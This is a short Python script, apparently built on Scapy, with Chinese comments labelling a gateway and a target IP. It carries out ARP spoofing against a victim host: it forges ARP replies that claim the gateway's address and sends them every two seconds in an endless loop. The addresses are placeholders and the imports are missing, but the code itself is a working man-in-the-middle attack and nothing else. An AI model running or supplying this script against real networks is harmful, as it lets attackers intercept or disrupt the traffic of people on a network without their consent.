def main():
    gatewayIP="x.x.x.x"#[网关]
    victimIP="x.x.x.x"#[目标ip]
    
    hackMAC="x:x:x:x:x:x"
    victimMAC="00:11:22:??:??:??"
    
    #print(getmacbyip("x.x.x.x"))

    packet=Ether()/ARP(psrc=gatewayIP,pdst=victimIP)
    
    while 1:
        sendp(packet)
        time.sleep(2)
        print(packet.show())
        
    
main()

    